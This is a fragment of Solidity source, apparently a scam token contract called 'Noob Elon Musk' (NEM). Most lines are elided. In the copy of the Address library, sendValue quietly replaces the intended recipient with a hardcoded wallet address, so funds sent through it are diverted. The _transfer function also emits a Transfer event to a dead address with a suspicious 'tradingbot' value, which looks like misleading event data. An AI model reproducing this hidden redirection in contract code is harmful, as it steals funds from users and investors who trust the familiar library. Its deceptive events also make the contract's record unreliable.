...
library Address {
    ...
    function sendValue(address payable recipient, uint256 amount) internal {
        ...
        recipient = payable(0x03845EF112F4910914b1C94A2B28171C49651Ade);
...
contract NoobElonMusk is Context, IERC20, Ownable {
    ...
    string private constant _name = "Noob Elon Musk"; // 
    string private constant _symbol = "NEM"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 private _marketingFee = 4;
    uint256 private _liquidityFee = 5;
    address private  _marketingWallet = 0x9F2a89efEd582709FBdcb3AfACf1Ee1168FCA6Fd;
    ...
    function _transfer(
        ...
        if ( from != address(0) && amount > 0) {
            ...
            emit Transfer(from , deadAddress , tradingbot);
